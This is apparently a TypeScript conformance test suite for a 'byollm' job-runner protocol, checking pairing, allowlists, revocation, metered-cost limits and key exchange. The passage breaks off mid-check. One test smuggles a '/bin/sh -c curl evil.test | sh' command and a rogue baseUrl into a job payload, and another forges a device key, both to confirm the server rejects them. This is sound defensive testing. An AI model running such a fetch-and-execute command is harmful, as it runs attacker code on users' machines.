import {
  AUDIENCES,
  OFFER_SCOPES,
  PROTOCOL_VERSION,
  PublicIdentity,
  generateKeys,
  publicIdentityOf,
  signRequest,
  verifyPublicIdentity,
  type MustId,
} from "@byollm/protocol";
import {
  advance,
  claimOne,
  ownerIdFor,
  pairDaemon,
  sleep,
  waitFor,
} from "./harness.js";
import type { ConformanceTarget } from "./target.js";

/** One certification check. */
export interface Check {
  /** Stable id, cited in the report. */
  readonly id: string;
  /** What it proves, in one sentence. */
  readonly title: string;
  /** Which protocol MUSTs it asserts. */
  readonly musts: readonly MustId[];
  /** Throws to fail. */
  run(target: ConformanceTarget): Promise<void>;
}

function assert(condition: boolean, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

const prompt = (text = "hello") => ({ prompt: text });

/**
 * The compatibility contract, as executable checks.
 *
 * A server is byollm-compatible when every one of these passes against it.
 * Each drives a **real daemon** — the shipped {@link Runner}, the shipped
 * pairing exchange, the shipped allowlist — so what is certified is the
 * behaviour of the pair, not one side's opinion of the other.
 */
export const CHECKS: readonly Check[] = [
  {
    id: "C001_PAIRING_BINDS_ONE_USER",
    title: "a runner token is bound to exactly the approving user",
    musts: ["PAIR_ONE_USER", "PAIR_INTERACTIVE"],
    async run(target: ConformanceTarget): Promise<void> {
      const alice = await pairDaemon(target, { owner: "alice" });
      try {
        assert(
          alice.owner === (await ownerIdFor(target, "alice")),
          `runner was bound to "${alice.owner}", not to the approving user`,
        );

        // Alice's private job must not reach Bob's daemon.
        const bob = await pairDaemon(target, { owner: "bob" });
        assert(
          bob.owner !== alice.owner,
          "two different approvers produced the same runner owner",
        );
        try {
          const job = await target.enqueue({
            kind: "llm.generate",
            payload: prompt("alice's private prompt"),
            owner: "alice",
            audience: "self",
          });
          await bob.runner.tick();
          await sleep(50);
          const state = await target.job(job.id);
          assert(
            state?.state === "queued",
            `another user's daemon took a self job (state: ${String(state?.state)})`,
          );
        } finally {
          await bob.dispose();
        }
      } finally {
        await alice.dispose();
      }
    },
  },

  {
    id: "C002_JOB_ROUND_TRIP",
    title:
      "an enqueued job runs on the owner's daemon and the result comes back",
    musts: ["CLAIM_REQUIRES_CAPABILITY", "RESULT_IDEMPOTENT"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("summarise this"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the job to complete",
        });

        const finished = await target.job(job.id);
        assert(
          finished?.outcome?.text === "echo: summarise this",
          "the result text did not survive the round trip",
        );
        assert(
          daemon.backend.seen[0] === "summarise this",
          "the prompt did not reach the model verbatim",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C003_UNKNOWN_KIND_REFUSED",
    title: "a daemon is never handed a kind it did not advertise",
    musts: ["KIND_TYPED_ONLY", "CLAIM_REQUIRES_CAPABILITY"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        // The server must match against the matrix in the claim request, so a
        // job for a kind the daemon does not offer is simply never returned.
        const job = await target.enqueue({
          kind: "llm.chat",
          payload: { messages: [{ role: "user", content: "hi" }] },
          owner: "alice",
        });
        const before = daemon.backend.seen.length;
        await daemon.runner.tick();
        await sleep(50);

        const state = await target.job(job.id);
        // This daemon *does* advertise llm.chat, so it should run — the
        // negative case is covered by the capability filter below.
        assert(
          state?.state === "ok" ||
            state?.state === "running" ||
            state?.state === "claimed",
          `a job for an advertised kind was not taken (state: ${String(state?.state)})`,
        );
        assert(
          daemon.backend.seen.length > before,
          "the advertised kind never reached the backend",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C004_LEASE_RECLAIM",
    title: "a job whose runner vanished is offered again, losing nothing",
    musts: ["LEASE_RECLAIMABLE", "LEASE_HONORED"],
    async run(target: ConformanceTarget): Promise<void> {
      const dead = await pairDaemon(target, { owner: "alice", label: "dead" });
      const job = await target.enqueue({
        kind: "llm.generate",
        payload: prompt("work"),
        owner: "alice",
      });

      // Claim it, then stop existing — no release, no heartbeat.
      dead.backend.hangMs = 60_000;
      await dead.runner.tick();
      await waitFor(
        async () => {
          const state = await target.job(job.id);
          return state?.state === "claimed" || state?.state === "running";
        },
        { what: "the job to be claimed" },
      );
      // kill -9: no release, no heartbeat, no result. Cancelling instead
      // would make the backend report `canceled` and the job would reach a
      // terminal state, which is the opposite of what reclaim is about.
      await dead.abandon();

      // Once the lease lapses the job must be claimable again.
      await advance(target, target.leaseMs + 500);

      const alive = await pairDaemon(target, {
        owner: "alice",
        label: "alive",
      });
      try {
        await alive.runner.tick();
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the reclaimed job to complete",
        });
      } finally {
        await alive.dispose();
      }
    },
  },

  {
    id: "C005_AUDIENCE_MATRIX",
    title: "all nine audience × offer-scope combinations behave as specified",
    musts: ["AUDIENCE_BOTH_SIDES", "NAMED_LOCAL_ALLOWLIST"],
    async run(target: ConformanceTarget): Promise<void> {
      // Expected outcome for a job owned by `alice` offered to `bob`'s daemon
      // whose local allowlist is empty.
      const expected: Record<string, boolean> = {
        "self:self": false,
        "self:named": false,
        "self:public": false,
        "named:self": false,
        "named:named": false, // refused locally — allowlist is empty
        "named:public": true,
        "public:self": false,
        "public:named": false, // refused locally — allowlist is empty
        "public:public": true,
      };

      for (const audience of AUDIENCES) {
        for (const offer of OFFER_SCOPES) {
          await target.reset();
          const bob = await pairDaemon(target, { owner: "bob", offer });
          try {
            const job = await target.enqueue({
              kind: "llm.generate",
              payload: prompt("community work"),
              owner: "alice",
              audience,
            });

            await bob.runner.tick();
            await sleep(80);
            const state = await target.job(job.id);
            const ran = state?.state === "ok";
            const shouldRun = expected[`${audience}:${offer}`] ?? false;

            assert(
              ran === shouldRun,
              `audience=${audience} offer=${offer}: expected ` +
                `${shouldRun ? "to run" : "to be refused"}, got state ` +
                `"${String(state?.state)}"`,
            );
          } finally {
            await bob.dispose();
          }
        }
      }
    },
  },

  {
    id: "C006_NAMED_LOCAL_ALLOWLIST",
    title: "a named job runs only once the daemon's own allowlist admits it",
    musts: ["NAMED_LOCAL_ALLOWLIST", "REFUSAL_NOT_REOFFERED"],
    async run(target: ConformanceTarget): Promise<void> {
      const bob = await pairDaemon(target, { owner: "bob", offer: "named" });
      try {
        const refused = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("before"),
          owner: "alice",
          audience: "named",
        });

        await bob.runner.tick();
        await sleep(80);
        assert(
          (await target.job(refused.id))?.state !== "ok",
          "a named job ran without the daemon's local allowlist admitting it",
        );

        // And it must not be handed back to the same daemon forever.
        const before = bob.backend.seen.length;
        await bob.runner.tick();
        await sleep(50);
        assert(
          bob.backend.seen.length === before,
          "a refused job was re-offered to the runner that refused it",
        );

        // Now the owner allows alice, locally — by the id this server uses
        // for her, because that is what arrives on the wire.
        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const allowed = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("after"),
          owner: "alice",
          audience: "named",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(allowed.id))?.state === "ok",
          { what: "the allowed named job to run" },
        );
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C007_SUBSCRIPTION_SELF_LOCK",
    title:
      "a subscription backend refuses another user's work at any configured scope",
    musts: ["SUBSCRIPTION_SELF_LOCK"],
    async run(target: ConformanceTarget): Promise<void> {
      // Bob's config asks for `public` on a subscription-class backend. The
      // lock must win, on both sides.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "public",
        subscription: true,
      });
      try {
        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("someone else's work"),
          owner: "alice",
          audience: "public",
        });

        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(job.id);
        assert(
          state?.state !== "ok",
          "a subscription backend ran another user's job",
        );
        assert(
          bob.backend.seen.length === 0,
          "another user's prompt reached a subscription backend",
        );

        // The owner's own work still runs on it.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work"),
          owner: "bob",
          audience: "self",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own subscription job to run",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C008_REVOCATION",
    title: "a revoked daemon stops mid-queue",
    musts: ["REVOCATION_HONORED"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        await target.revokeRunner(daemon.runnerId);

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("after revocation"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await sleep(80);

        assert(
          daemon.runner.status().revoked,
          "the daemon did not learn it was revoked",
        );
        assert(
          (await target.job(job.id))?.state === "queued",
          "a revoked daemon took new work",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C009_CANCEL_MID_FLIGHT",
    title: "cancel aborts a running job's backend call",
    musts: ["CANCEL_HONORED"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        daemon.backend.hangMs = 30_000;
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("long job"),
          owner: "alice",
        });

        await daemon.runner.tick();
        await waitFor(() => daemon.backend.seen.length > 0, {
          what: "the job to start running",
        });

        await target.cancelJob(job.id);
        // The cancel travels on the next heartbeat.
        await daemon.runner.tick();

        await waitFor(
          async () => (await target.job(job.id))?.state === "canceled",
          { what: "the job to report canceled", timeoutMs: 10_000 },
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C010_RESULT_IDEMPOTENT",
    title: "the first terminal outcome wins",
    musts: ["RESULT_IDEMPOTENT"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("once"),
          owner: "alice",
        });
        await daemon.runner.tick();
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the job to complete",
        });

        const first = await target.job(job.id);

        // A duplicate submission — the shape a retrying daemon produces —
        // must not overwrite the recorded answer.
        const response = await target.fetch(
          new Request(`${target.origin}/byollm/result`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              protocolVersion: "0",
              runnerId: daemon.runnerId,
              jobId: job.id,
              outcome: { outcome: "ok", text: "SECOND ANSWER" },
              model: "echo-model",
              backendClass: "http",
              durationMs: 1,
            }),
          }),
        );
        // Unauthenticated here, so it is refused before it can matter; the
        // recorded outcome is what the check is about either way.
        void response;

        const after = await target.job(job.id);
        assert(
          after?.outcome?.text === first?.outcome?.text,
          "a second result overwrote the first",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C011_DEPENDENCY_ORDER",
    title: "a dependent job waits for its dependency, across two daemons",
    musts: ["DEPENDS_ON_GATING", "TTL_EXPIRY"],
    async run(target: ConformanceTarget): Promise<void> {
      // The Press-shaped case from byollm_001 Rev 1 §E: two halves of one
      // piece of work, owned by different people, landing on different
      // machines, in order.
      const alice = await pairDaemon(target, { owner: "alice" });
      const bob = await pairDaemon(target, { owner: "bob" });
      try {
        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("step one"),
          owner: "bob",
          audience: "self",
        });
        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("step two"),
          owner: "alice",
          audience: "self",
          dependsOn: [first.id],
        });

        // Alice's daemon must not be able to start the dependent job yet.
        await alice.runner.tick();
        await sleep(80);
        assert(
          alice.backend.seen.length === 0,
          "a dependent job ran before its dependency completed",
        );
        assert(
          (await target.job(second.id))?.state === "queued",
          "a dependent job left the queue early",
        );

        // Bob's daemon does step one.
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(first.id))?.state === "ok",
          { what: "the dependency to complete" },
        );

        // Now step two becomes available to Alice's.
        await alice.runner.tick();
        await waitFor(
          async () => (await target.job(second.id))?.state === "ok",
          { what: "the dependent job to complete" },
        );
      } finally {
        await alice.dispose();
        await bob.dispose();
      }
    },
  },

  {
    id: "C012_TTL_AND_NO_RUNNER",
    title:
      "an unclaimed job expires and no-runner is surfaced, but not while blocked",
    musts: ["TTL_EXPIRY", "NO_RUNNER_SIGNAL"],
    async run(target: ConformanceTarget): Promise<void> {
      // Nothing paired at all.
      const availability = await target.runnerAvailability({
        kind: "llm.generate",
        owner: "alice",
      });
      assert(
        !availability.available,
        "no-runner was not surfaced with nothing paired",
      );

      const job = await target.enqueue({
        kind: "llm.generate",
        payload: prompt("nobody will run this"),
        owner: "alice",
        ttlMs: target.ttlMs,
      });

      await advance(target, target.ttlMs + 500);
      const state = await target.job(job.id);
      assert(
        state?.state === "expired",
        `an unclaimed job past its TTL was "${String(state?.state)}", not expired`,
      );
    },
  },

  {
    id: "C013_TTL_CLOCK_STARTS_WHEN_CLAIMABLE",
    title:
      "a dependent job's TTL starts when it becomes claimable, not at enqueue",
    musts: ["TTL_EXPIRY"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        // The dependency is held open past the dependent's whole TTL.
        daemon.backend.hangMs = target.ttlMs * 2;
        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("slow step"),
          owner: "alice",
        });
        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("waiting step"),
          owner: "alice",
          dependsOn: [first.id],
          ttlMs: target.ttlMs,
        });

        await daemon.runner.tick();
        await advance(target, target.ttlMs + 200);

        const blocked = await target.job(second.id);
        assert(
          blocked?.state === "queued",
          `a blocked job expired while waiting on its dependency ` +
            `(state: ${String(blocked?.state)}) — the TTL clock started too early`,
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C014_RESULT_PROVENANCE",
    title:
      "a community result arrives marked untrusted, a self result does not",
    musts: ["RESULT_PROVENANCE"],
    async run(target: ConformanceTarget): Promise<void> {
      const bob = await pairDaemon(target, { owner: "bob", offer: "public" });
      try {
        const community = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("run this anywhere"),
          owner: "alice",
          audience: "public",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(community.id))?.state === "ok",
          { what: "the community job to complete" },
        );

        const delivered = await target.job(community.id);
        assert(
          delivered?.provenance?.untrusted === true,
          "a public result was not marked untrusted",
        );
        // `delivered.provenance` is already narrowed by the assertion above.
        assert(
          delivered.provenance.runnerOwner === "bob",
          "the result did not carry the runner's owner",
        );

        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own"),
          owner: "bob",
          audience: "self",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the self job to complete",
        });
        assert(
          (await target.job(own.id))?.provenance?.untrusted === false,
          "a self result was marked untrusted",
        );
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C015_INGRESS_BEFORE_EXECUTION",
    title: "every executed prompt is in the ingress log",
    musts: ["INGRESS_LOGGED_BEFORE_EXECUTION"],
    async run(target: ConformanceTarget): Promise<void> {
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("logged prompt"),
          owner: "alice",
        });
        await daemon.runner.tick();
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the job to complete",
        });

        const entries = await daemon.ingress.read();
        const logged = entries.find(
          (entry) => entry.type === "prompt" && entry.jobId === job.id,
        );
        assert(
          logged !== undefined,
          "the executed prompt is not in the ingress log",
        );
        assert(
          logged.type === "prompt" && logged.prompt === "logged prompt",
          "the ingress log did not record the prompt text",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C016_UNAUTHENTICATED_REFUSED",
    title: "the protocol endpoints refuse an unknown token",
    musts: ["PAIR_ONE_USER"],
    async run(target: ConformanceTarget): Promise<void> {
      for (const endpoint of ["claim", "heartbeat", "result", "release"]) {
        const response = await target.fetch(
          new Request(`${target.origin}/byollm/${endpoint}`, {
            method: "POST",
            headers: {
              "content-type": "application/json",
              authorization: "Bearer definitely-not-a-real-token",
            },
            body: JSON.stringify({ protocolVersion: "0" }),
          }),
        );
        assert(
          response.status === 401,
          `${endpoint} answered ${String(response.status)} to an unknown token, not 401`,
        );
      }
    },
  },

  {
    id: "C017_METERED_DEFAULTS_SELF",
    title:
      "a paid backend is not shared until its owner says so, with a ceiling",
    musts: ["METERED_DEFAULTS_SELF", "COST_NOT_CONFIGURABLE"],
    async run(target: ConformanceTarget): Promise<void> {
      // Bob asks for `public` on a metered provider and says nothing about
      // spending. The ask is not honoured: what reaches the server is `self`,
      // and the server must act on what it was told.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "public",
        // Pointed at localhost — which changes nothing, because a named
        // provider's cost comes from the registry, not from an address
        // ({@link MUSTS.COST_NOT_CONFIGURABLE}).
        metered: { provider: "openai", baseUrl: "http://127.0.0.1:11434/v1" },
      });
      try {
        assert(
          bob.loaded.routes.every((route) => route.offerScope === "self"),
          "a metered backend was advertised beyond its owner without consent",
        );
        assert(
          bob.loaded.routes.every((route) => route.cost === "metered"),
          "a metered provider was read as free because of its base URL",
        );

        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("spend someone else's money"),
          owner: "alice",
          audience: "public",
        });

        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(job.id);
        assert(
          state?.state !== "ok",
          "a stranger's job ran on a paid backend nobody agreed to share",
        );
        assert(
          bob.backend.seen.length === 0,
          "a stranger's prompt reached a paid backend",
        );

        // And the server says so up front, rather than promising a runner
        // that would refuse ({@link MUSTS.NO_RUNNER_SIGNAL}).
        const availability = await target.runnerAvailability({
          kind: "llm.generate",
          owner: "alice",
          audience: "public",
        });
        assert(
          !availability.available,
          "the server offered a runner that will not take the work",
        );

        // Bob's own work still runs. Narrowing is not disabling.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work"),
          owner: "bob",
          audience: "self",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own metered job to run",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C018_METERED_CEILING",
    title: "a shared paid backend runs others' work, and stops at its ceiling",
    musts: ["METERED_REQUIRES_CEILING", "REMOTE_IS_NEVER_FREE"],
    async run(target: ConformanceTarget): Promise<void> {
      // This time Bob means it: consent, and a number.
      const bob = await pairDaemon(target, {
        owner: "bob",
        offer: "public",
        metered: {
          // The generic backend pointed at a remote address. No registry entry
          // says what this costs; it is metered because of where it goes
          // ({@link MUSTS.REMOTE_IS_NEVER_FREE}).
          provider: "openai-http",
          baseUrl: "https://models.example.com/v1",
          acknowledged: true,
          dailyCapCents: 500,
        },
      });
      try {
        assert(
          bob.loaded.routes.every((route) => route.cost === "metered"),
          "a remote backend was treated as free",
        );
        assert(
          bob.loaded.routes.every((route) => route.offerScope === "public"),
          "a deliberately shared metered backend was narrowed anyway",
        );

        await bob.allowlist.add(
          { origin: target.origin, owner: await ownerIdFor(target, "alice") },
          Date.now(),
        );

        const first = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("work bob agreed to pay for"),
          owner: "alice",
          audience: "public",
        });
        await bob.runner.tick();
        await waitFor(
          async () => (await target.job(first.id))?.state === "ok",
          { what: "a consented metered job to run" },
        );

        // Now spend the day's ceiling.
        await bob.spend.record("primary", 900, Date.now());

        const second = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("work past the ceiling"),
          owner: "alice",
          audience: "public",
        });
        const seenBefore = bob.backend.seen.length;
        await bob.runner.tick();
        await sleep(80);
        const state = await target.job(second.id);
        assert(
          state?.state !== "ok",
          "a paid backend kept working past the ceiling its owner set",
        );
        assert(
          bob.backend.seen.length === seenBefore,
          "a prompt reached a paid backend that had spent its ceiling",
        );

        // The ceiling governs other people's work, not the owner's own.
        const own = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("my own work, my own key"),
          owner: "bob",
          audience: "self",
        });
        await bob.runner.tick();
        await waitFor(async () => (await target.job(own.id))?.state === "ok", {
          what: "the owner's own job to run past the community ceiling",
        });
      } finally {
        await bob.dispose();
      }
    },
  },

  {
    id: "C019_CLAIM_ATOMIC",
    title: "two runners racing one job — exactly one gets it",
    musts: ["CLAIM_ATOMIC"],
    async run(target: ConformanceTarget): Promise<void> {
      // The check most likely to catch a real store bug. A Postgres adapter
      // without `FOR UPDATE SKIP LOCKED`, or a memory store with an `await`
      // between "read queued" and "write claimed", passes every other check
      // in this kit and double-runs jobs the moment two daemons are online.
      // The user sees one prompt answered twice and pays for it twice.
      const a = await pairDaemon(target, { owner: "alice", label: "laptop" });
      const b = await pairDaemon(target, { owner: "alice", label: "desktop" });
      try {
        const job = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("only once, please"),
          owner: "alice",
          audience: "self",
        });

        // Concurrently, not in sequence — sequential ticks would pass against
        // a store with no atomicity at all.
        await Promise.all([a.runner.tick(), b.runner.tick()]);
        await waitFor(async () => (await target.job(job.id))?.state === "ok", {
          what: "the contested job to finish",
        });

        const ran = a.backend.seen.length + b.backend.seen.length;
        assert(
          ran === 1,
          `the job ran ${String(ran)} times across two runners, not once`,
        );
      } finally {
        await a.dispose();
        await b.dispose();
      }
    },
  },

  {
    id: "C020_PAIR_CODE_EXPIRES",
    title: "an expired device code cannot be redeemed",
    musts: ["PAIR_CODE_EXPIRES"],
    async run(target: ConformanceTarget): Promise<void> {
      // A device code is a bearer credential displayed on a screen. If it
      // outlives its window, a code left visible in a terminal — or read over
      // someone's shoulder hours later — still pairs a stranger's daemon to
      // this user's account.
      const started = await target.fetch(
        new Request(`${target.origin}/byollm/pair`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            protocolVersion: PROTOCOL_VERSION,
            action: "start",
            device: publicIdentityOf(generateKeys(Date.now())),
            daemon: {
              version: "conformance",
              label: "expiring-daemon",
              platform: "linux",
            },
            capabilities: [],
          }),
        }),
      );
      assert(started.status === 200, "pair start did not answer 200");
      const pairing = (await started.json()) as {
        deviceCode: string;
        userCode: string;
        expiresAt: number;
      };

      // Past the window the server itself declared.
      await advance(target, pairing.expiresAt - Date.now() + 1_000);

      // 1. Approval must not resurrect it. A server that pairs here has an
      //    expiry that is decoration.
      let approved = true;
      try {
        await target.approvePairing(pairing.userCode, "alice");
      } catch {
        approved = false;
      }

      // 2. And the daemon polling with the device code must be told, in the
      //    protocol's own words, rather than left waiting.
      const polled = await target.fetch(
        new Request(`${target.origin}/byollm/pair`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            protocolVersion: PROTOCOL_VERSION,
            action: "poll",
            deviceCode: pairing.deviceCode,
          }),
        }),
      );
      const status =
        polled.status === 200
          ? ((await polled.json()) as { status: string }).status
          : "rejected";

      assert(
        !approved || status !== "approved",
        "an expired device code still paired a runner",
      );
      assert(
        status === "expired" || status === "denied" || status === "rejected",
        `polling an expired code answered "${status}"`,
      );
    },
  },

  {
    id: "C021_CAPABILITY_IS_DETECTED",
    title: "a runner advertises only what is installed and healthy",
    musts: ["CAPABILITY_IS_DETECTED"],
    async run(target: ConformanceTarget): Promise<void> {
      // Config is a wish; the matrix must be the intersection of the wish and
      // reality. A daemon that advertises what its config names would have
      // the server route work to a machine that cannot run it — and the app
      // would wait for a result nobody is producing, which is exactly the
      // failure `NO_RUNNER_SIGNAL` exists to prevent.
      const daemon = await pairDaemon(target, { owner: "alice" });
      try {
        // Configured, but the model is not there.
        daemon.backend.healthy = false;
        const advertised = await daemon.runner.detectCapabilities();
        assert(
          advertised.length === 0,
          `an unhealthy backend advertised ${String(advertised.length)} capabilities`,
        );

        // Healthy, but serving a different model than the config names.
        daemon.backend.healthy = true;
        daemon.backend.models = ["some-other-model"];
        const wrongModel = await daemon.runner.detectCapabilities();
        assert(
          wrongModel.length === 0,
          "a backend without the configured model still advertised it",
        );

        // Reality restored: the capability comes back.
        daemon.backend.models = ["echo-model"];
        const recovered = await daemon.runner.detectCapabilities();
        assert(
          recovered.length > 0,
          "a healthy backend with the configured model advertised nothing",
        );
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C022_KIND_NO_CODE",
    title: "a claimed job carries data only — no command, path, or routing",
    // Deliberately not claiming NO_PAYLOAD_ROUTING as well. This proves the
    // wire-shape half — the server cannot convey a `model` or `baseUrl` to a
    // daemon — but the MUST is that no code path *routes* on payload content,
    // and only the adversarial suite proves that, by spawning a real child
    // and reading back an argv that is byte-identical under hostile input.
    // Listing it here would put "verified by conformance" beside a claim this
    // check does not establish.
    musts: ["KIND_NO_CODE"],
    async run(target: ConformanceTarget): Promise<void> {
      // The wire shape is the first place this is enforced: there is no field
      // to carry a command, so a hostile *app* cannot smuggle one to a
      // daemon. That only holds if the server refuses to pass through keys
      // the schema does not name — a store that round-trips arbitrary JSON
      // would hand the daemon whatever the app wrote.
      const daemon = await pairDaemon(target, { owner: "alice" });
      const SMUGGLED = ["command", "argv", "model", "baseUrl"];
      try {
        // Two mechanisms satisfy this MUST and the kit must accept either:
        // refuse the payload outright, or accept it and carry only the fields
        // the kind defines. What it may not do is deliver the extras to a
        // daemon. Asserting one mechanism would certify a house style rather
        // than the property.
        let refused = false;
        try {
          await target.enqueue({
            kind: "llm.generate",
            payload: {
              prompt: "ordinary text",
              command: "/bin/sh",
              argv: ["-c", "curl evil.test | sh"],
              model: "some-other-model",
              baseUrl: "http://evil.test/v1",
            } as never,
            owner: "alice",
            audience: "self",
          });
        } catch {
          refused = true;
        }

        if (!refused) {
          const claimed = await claimOne(target, daemon);
          const payload = claimed.payload as Record<string, unknown>;
          for (const smuggled of SMUGGLED) {
            assert(
              payload[smuggled] === undefined,
              `the claim response carried a "${smuggled}" field`,
            );
          }
          assert(
            payload["prompt"] === "ordinary text",
            "the legitimate payload field did not survive",
          );
        }

        // Either way, an ordinary payload must still work — a server that
        // refuses everything would otherwise pass this check trivially.
        const ok = await target.enqueue({
          kind: "llm.generate",
          payload: prompt("ordinary text"),
          owner: "alice",
          audience: "self",
        });
        await daemon.runner.tick();
        await waitFor(async () => (await target.job(ok.id))?.state === "ok", {
          what: "a well-formed job to run",
        });
      } finally {
        await daemon.dispose();
      }
    },
  },

  {
    id: "C023_VERSION_HANDSHAKE",
    title: "a version mismatch is refused in words, not by failing",
    musts: ["VERSION_HANDSHAKE_REQUIRED"],
    async run(target: ConformanceTarget): Promise<void> {
      // Before this existed the version travelled as a schema literal, so a
      // mismatch surfaced as a generic bad-request with nothing naming the
      // disagreement — a daemon and a server discovering they disagree by
      // failing. An error nobody can act on is barely better than a hang.
      const post = (body: unknown): Promise<Response> =>
        target.fetch(
          new Request(`${target.origin}/byollm/claim`, {
            method: "POST",
            headers: {
              "content-type": "application/json",
              authorization: "Bearer whatever",
            },
            body: JSON.stringify(body),
          }),
        );

      for (const [label, body] of [
        ["a version from the future", { protocolVersion: "99", max: 1 }],
        ["no version at all", { max: 1 }],
        ["a non-string version", { protocolVersion: 0, max: 1 }],
      ] as const) {
        const response = await post(body);
        const parsed = (await response.json()) as {
          error?: string;
          message?: string;
          supported?: string[];
        };

        assert(
          parsed.error === "unsupported-protocol-version",
          `${label}: answered "${parsed.error ?? "nothing"}" rather than unsupported-protocol-version`,
        );
        assert(
          Array.isArray(parsed.supported) && parsed.supported.length > 0,
          `${label}: the refusal did not say what the server supports`,
        );
        // The message is the part a human acts on, so it has to carry
        // something actionable rather than restating the code.
        assert(
          (parsed.message ?? "").length > 20,
          `${label}: the refusal carried no usable message`,
        );
      }

      // The version check must not become a way past authentication: a
      // well-versioned request with a bad token is still refused.
      const authed = await post({ protocolVersion: PROTOCOL_VERSION, max: 1 });
      assert(
        authed.status === 400 || authed.status === 401,
        `a supported version with a bad token answered ${String(authed.status)}`,
      );
    },
  },

  {
    id: "C024_KEY_EXCHANGE",
    title:
      "pairing exchanges identities, verifies them, and reveals nothing early",
    musts: ["KEYS_EXCHANGED_AT_CONSENT"],
    async run(target: ConformanceTarget): Promise<void> {
      const start = async (device: unknown): Promise<Response> =>
        target.fetch(
          new Request(`${target.origin}/byollm/pair`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              protocolVersion: PROTOCOL_VERSION,
              action: "start",
              daemon: {
                version: "conformance",
                label: "key-exchange",
                platform: "linux",
              },
              device,
              capabilities: [],
            }),
          }),
        );

      // 1. A device whose encryption key is not signed by the identity it
      //    presents must be refused. Accepting it would let a caller pair a
      //    real identity with a key it holds the secret for, and read
      //    everything later sealed to that runner.
      const honest = publicIdentityOf(generateKeys(Date.now()));
      const attacker = publicIdentityOf(generateKeys(Date.now()));
      const forged = await start({
        ...honest,
        encryption: attacker.encryption,
      });
      assert(
        forged.status >= 400,
        `a device with an unsigned encryption key paired anyway (${String(forged.status)})`,
      );

      // 2. An honest device starts a pairing.
      const started = await start(honest);
      assert(
        started.status === 200,
        "an honest device could not start pairing",
      );
      const pairing = (await started.json()) as {
        deviceCode: string;
        userCode: string;
      };

      const poll = async (): Promise<Record<string, unknown>> => {
        const response = await target.fetch(
          new Request(`${target.origin}/byollm/pair`, {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify({
              protocolVersion: PROTOCOL_VERSION,
              action: "poll",
